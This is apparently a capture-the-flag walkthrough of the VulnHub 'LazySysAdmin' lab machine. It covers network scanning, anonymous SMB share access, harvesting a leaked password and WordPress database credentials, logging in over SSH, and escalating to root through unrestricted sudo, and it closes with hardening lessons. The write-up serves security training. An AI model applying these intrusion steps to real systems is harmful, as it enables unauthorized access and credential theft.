# LazySysAdmin: Walkthrough

## Overview
**Machine Name**: LazySysAdmin
**Platform**: VulnHub
**Difficulty**: Easy
**OS**: Linux (Ubuntu 14.04)
**Focus**: SMB Share Enumeration, Wordpress Config Credential Harvesting, Sudo Privilege Escalation

## Enumeration
### Network Discovery
An ARP scan identified the target machine IP address: `192.168.29.110`.
```bash
arp-scan -l -I eth1
```
![](screenshots/Pasted%20image%2020260425181415.png)

### Port Scanning
A full TCP port scan was executed:
```bash
nmap -T4 -A -p- 192.168.29.110
```
Open ports list:
| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | ssh | OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 |
| 80/tcp | http | Apache httpd 2.4.7 (Ubuntu) |
| 139/tcp | netbios-ssn | Samba |
| 445/tcp | microsoft-ds | Samba |

### SMB Share Enumeration
Samba share scanning allowed anonymous guest access. 
Examining the shares revealed an administrative configuration note `deleteme.txt` that discussed password policy and leaked a key credential string:
`Password: 12345`.

### Wordpress Config Enumeration
Accessing the web server files via Samba shared directory allowed reading the WordPress configuration file `wp-config.php`:
```php
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

## Exploitation
### SSH Credential Spraying
System usernames were found inside the Samba home folders. A password spray attack using the leaked password `12345` was attempted against the username `togie`:
```bash
ssh togie@192.168.29.110
```
![](screenshots/Pasted%20image%2020260425232742.png)
```bash
whoami
togie
```

## Privilege Escalation
### Sudo Hijack
Enumerate sudo permissions for the user `togie`:
```bash
sudo -l
```
The output showed that `togie` was allowed to execute all commands as `root` without restriction.

Spawning a root shell using sudo:
```bash
sudo su
whoami
root
```

## Post-Exploitation
### Flag Recovery
- Root Flag (`/root/proof.txt`):
  ```bash
  root@LazySysAdmin:~# cat proof.txt
  WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
  2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
  pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
  bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
  ```

## Lessons Learned
1. Disable anonymous/guest read-write access to Samba/SMB file shares.
2. Remove diagnostic files and configuration notes containing system passwords before releasing servers to production.
3. Configure appropriate access controls and restrict universal sudo privileges on administrator accounts.
